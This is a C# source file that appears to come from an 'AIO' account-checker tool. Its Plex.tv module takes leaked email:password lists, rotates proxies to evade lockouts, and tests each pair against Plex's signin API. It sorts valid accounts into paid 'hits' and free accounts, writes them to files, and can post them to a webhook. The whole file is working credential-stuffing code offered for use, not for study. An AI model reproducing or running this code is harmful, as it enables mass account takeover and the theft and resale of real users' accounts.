using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Plextvmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            var httpResponse = req.Get("https://plex.tv/api/v2/users/signin");
                            var value = httpResponse["X-Request-Id"];
                            req.AddHeader("X-Plex-Client-Identifier", value);

                            var res = req.Post("https://plex.tv/api/v2/users/signin",
                                    string.Concat("email=" + array[0] + "&login=" + array[0] + "&password=" + array[1] +
                                                  "&includeProviders=true"), "application/x-www-form-urlencoded")
                                .ToString();
                            switch (res)
                            {
                                case string a when res.Contains("User could not be authenticated") ||
                                                   res.Contains(
                                                       "User could not be authenticated. This IP appears to be having trouble signing in to an account (detected repeated failures)\"") ||
                                                   res.Contains("X-Plex-Client-Identifier is missing"):

                                    break;

                                case string b when res.Contains("username=\"") ||
                                                   res.Contains("subscriptionDescription=\""):
                                    var text3 = Parse(res, "subscriptionDescription=\"", "\"");
                                    var text4 = Parse(res, "subscribedAt=\"", "\"");
                                    var text5 = Parse(res, "status=\"", "\"");
                                    if (text5.Contains("Active") || !text5.Contains("Inactive"))
                                    {
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Plextv_hits",
                                            array[0] + ":" + array[1] + " |  SubscribedSince: " + text4);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Plextv",
                                                array[0] + ":" + array[1] + " |  SubscribedSince: " + text4);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(
                                                array[0] + ":" + array[1] + " |  SubscribedSince: " + text4,
                                                "Plex TV Hits");
                                    }
                                    else if (!text5.Contains("Active") || text5.Contains("Inactive"))
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Plextv_frees", array[0] + ":" + array[1]);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("Plextv", array[0] + ":" + array[1]);
                                    }

                                    break;

                                default:
                                    Program.Errors++;
                                    break;
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}